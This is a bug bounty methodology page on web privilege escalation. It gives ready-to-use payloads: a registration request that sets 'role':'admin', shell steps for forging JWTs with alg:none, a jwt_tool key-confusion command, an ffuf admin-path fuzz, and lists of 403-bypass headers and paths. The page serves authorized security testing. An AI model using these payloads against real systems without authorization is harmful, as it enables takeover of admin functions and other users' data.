> Source: https://bugbounty.info/Attack-Surface/Web/Authorization/Privilege-Escalation

# Privilege Escalation

Vertical authorization failures  -  where a lower-privileged user gains access to higher-privileged functions or data. These pay well because the impact is concrete: you can demonstrate accessing admin functionality, other users' data, or modifying your own permissions.

## Role Parameter Tampering

The simplest version  -  the role is just a parameter the client sends, and the server trusts it.

**Registration / profile update:**

```http
POST /api/v1/users/register HTTP/1.1
Content-Type: application/json
 
{
  "email": "attacker@evil.com",
  "password": "password123",
  "role": "admin"
}
```

Try adding `role`, `is_admin`, `user_type`, `account_type`, `subscription` to any POST/PUT/PATCH body. What does the server accept?

**Hidden form fields:**

```html
<input type="hidden" name="role" value="user">
```

Change `user` to `admin` before submitting. Still happens on older apps.

## JWT Claim Modification

JWTs are base64-encoded and signed  -  but if the signature isn't validated properly, you can modify the claims.

**Algorithm: none attack**  -  change the algorithm to `none` and strip the signature:

```bash
# Decode header
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}
 
# Modify: {"alg":"none","typ":"JWT"}
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
# New header
 
# Modify payload: change "role":"user" to "role":"admin"
echo "eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIn0=" | base64 -d
# {"user_id":123,"role":"user"}
 
echo -n '{"user_id":123,"role":"admin"}' | base64 | tr -d '='
 
# Construct: HEADER.PAYLOAD. (empty signature, trailing dot)
```

**RS256 -> HS256 confusion**  -  if the server uses RS256 (asymmetric), the public key is... public. If you can trick the server into treating the public key as an HMAC secret:

```bash
# Sign the JWT with HS256 using the server's public key as the HMAC secret
# jwt_tool automates this
python3 jwt_tool.py TOKEN -X k -pk public_key.pem
```

**jwt_tool** is the go-to for JWT attacks. Run it with `-T` to tamper interactively.

## Forced Browsing to Admin Endpoints

Admin interfaces are often at predictable paths. The app might not show them in the UI for non-admins, but it might not enforce the access control either.

```bash
/admin
/admin/users
/admin/dashboard
/management
/internal
/backstage
/superuser
/staff
/moderator
/_admin
/api/admin/...
/api/internal/...
```

Use a wordlist like `SecLists/Discovery/Web-Content/big.txt` combined with admin-specific ones. Feroxbuster or ffuf:

```bash
ffuf -u https://target.com/FUZZ -w /path/to/SecLists/Discovery/Web-Content/common.txt \
  -H "Cookie: session=YOUR_SESSION" \
  -mc 200,301,302,403 \
  -o admin_fuzz.json
```

A 403 is interesting  -  the endpoint exists but is blocked. Sometimes those 403s are bypassable.

## 403 Bypass Techniques

When you find an admin endpoint returning 403:

```http
# Header-based bypasses
GET /admin HTTP/1.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1
 
# Path-based bypasses
GET /ADMIN
GET /admin/
GET /admin/.
GET /%2fadmin
GET /admin;/
GET /./admin
GET //admin//
```

## Privilege Escalation via Email Domain

Some apps grant elevated roles based on email domain. If `@company.com` users get admin access and the app allows free registration:

- Find if there's email domain-based role assignment in the app behavior
- Can you register with a `@company.com` email if you control that domain or a subdomain?
- Can you change your email after registration to a privileged domain?

## Checklist

- Add `role`/`is_admin`/`user_type` to registration and profile update requests
- JWT algorithm confusion (`none`, RS256->HS256)
- JWT claim modification  -  change role/permission claims
- Forced browsing to `/admin`, `/internal`, `/api/admin/*`
- 403 bypass on any found admin endpoints
- Mass assignment on user update endpoints (see [BOLA](../../../Attack-Surface/Web/Authorization/BOLA))
- Check if password change / account action applies to other users (vertical IDOR)

## Public Reports

Real-world privilege escalation findings across bug bounty programs:

- Privilege escalation from any user to admin on GitLab - [HackerOne #493324](https://hackerone.com/reports/493324)
- GitHub App privilege escalation to full admin/owner access - [HackerOne #1732595](https://hackerone.com/reports/1732595)
- Privilege escalation to root SSH keys on GitHub - [HackerOne #2336236](https://hackerone.com/reports/2336236)

## Related Pages

- [IDOR](../../../Attack-Surface/Web/Authorization/IDOR)  -  horizontal privilege: same level, different account
- [BOLA](../../../Attack-Surface/Web/Authorization/BOLA)  -  function-level authorization failures in APIs
- [SSO](../../../Attack-Surface/Web/Authentication/SSO)  -  SAML attribute manipulation for role escalation
- [Session Management](../../../Attack-Surface/Web/Authentication/Session-Management)  -  JWT specifics on stateless sessions
